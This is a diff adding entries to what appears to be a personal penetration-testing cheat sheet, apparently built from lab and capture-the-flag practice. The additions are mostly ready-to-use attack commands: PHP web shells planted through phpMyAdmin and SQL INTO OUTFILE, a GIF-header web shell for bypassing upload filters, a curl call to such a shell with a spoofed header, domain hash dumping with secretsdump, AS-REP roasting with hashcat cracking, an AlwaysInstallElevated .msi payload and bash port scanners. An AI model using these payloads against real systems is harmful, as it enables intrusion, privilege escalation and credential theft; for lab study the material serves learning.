@@ -13,6 +13,13 @@ Frequently used commands that are searchable with your browser's search function
 
 ![available_commands](images/002_available_commands.png)
 
+## AllwaysInstallElevated / Windows
+
+* check for it:
+	* `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
+	* `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
+	* execute .msi payload: `msiexec /i "C:\xampp\htdocs\shenzi\notavirus.msi"`
+
 ## Amass
 Really good if you need to enumerate subdomains, just make sure you start it at night before going to bed :)
 
@@ -27,6 +34,31 @@ Really good if you need to enumerate subdomains, just make sure you start it at 
 ## awk
 
 * extracting the first and third field `echo "hello::there::friend" | awk -F "::" '{print $1, $3}'`
+
+## bash
+
+* ping scan
+
+```
+#!/bin/bash
+
+for ip in `seq 1 10`;do
+ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
+done
+```
+
+* port scan
+
+```
+#!/bin/bash
+
+host=10.5.5.13
+for port in {1...65535}; do
+	timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
+		echo "port $port is open"
+done
+echo "Done"
+```
 
 ## Binwalk 
 Extracts files hidden in pictures, pretty good for stegonograpy.
@@ -131,6 +163,10 @@ Once you installed **_Juice Shop_** and want to run it on different ocasions the
 sudo docker run --rm -p 3000:3000 bkimminich/juice-shop
 ```
 
+## Extract IPs from a text file
+
+* `grep -o ‘[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}’ nmapfile.txt`
+
 ## gcc
 
 * install the cross-architecture C header files with the following command:
@@ -175,7 +211,11 @@ I mainly created this part because of the web login attack part. Sometimes it's 
 
 ## Impacket
 
+* if got ntds.dit and SYSTEM files (SeBackupPrivilege) then use secretsdump: `secretsdump.py -ntds ./ntds.dit -system ./SYSTEM LOCAL`
+* ASREPROASTING: `GetNPUsers.py spookysec.local/svc-admin -no-pass -format hashcat -dc-ip 10.10.159.22 -k | tee asrep-result.txt` and for cracking the hashes: `hashcat -m 18200 --wordlist /usr/share/wordlists/rockyou.txt -O --show`
+
 ## psexec
+
 * `psexec.py <username>:'<password>'@<IP>`
 
 ## Install Python3 on Ubuntu
@@ -223,6 +263,10 @@ If you need to generate a nice html report from the output you can use *_xsltpro
 2. `xfreerdp /u:<username> /p:'<password>' /v:<target IP>` now we can connect to it from kali
 3. To disable it: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`
 
+## phpmyadmin
+
+* `select ("<?php system($_REQUEST['cmd'])?>") INTO DUMPFILE C:\\wamp\\apps\\phpmyadmin5.0.2\\cmd.php`
+
 ## playing with encoding and hashes
 If you are interested in more depth on this matter check out the cyberchef's website.
 
@@ -244,6 +288,10 @@ If you are interested in more depth on this matter check out the cyberchef's web
 ## RDP (rdesktop) with local file share
 
 * `rdesktop -u <username> -d <domain> -p <password> -r disk:local="/home/kali/Desktop/fileshare" <host IP>:<PORT>`
+
+## Restricted traffic bypass
+
+* `curl -X POST -H 'X-Forwarded-For: <PIVOT IP>' --data 'data=id' http://<TARGET IP>/cmd.php>`
 
 ## sed
 
@@ -286,6 +334,10 @@ If you are interested in more depth on this matter check out the cyberchef's web
 * load the created ticket into memory and then use psexec to get a shell on the target machine
 * `Rubeus.exe ptt /ticket:ticket.kirbi`
 * `PsExec.exe \\dc01.krbtown.local cmd`
+
+## sql
+
+* into outfile: `SELECT “<?php system($_GET['cmd']); ?>” into outfile “/var/www/WEBROOT/backups”`
 
 ## sqlmap
 One of my favorite tecniques I learned from [ippsec](https://ippsec.rocks/?#) is to capture a login request with Burp and save it in a file like login.req, then in sqlmap I can just use `sqlmap -r login.req --level 5 --risk 3` to try to find a vuln.
@@ -504,6 +556,15 @@ ip rule show
 ## unfurl for searching for login forms
 
 * `cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent`
+
+## Upload file type bypass
+
+* Upload image:
+
+```
+GIF89a1
+<?php system($_POST['cmd']); ?>
+```
 
 ## virtualbox
 
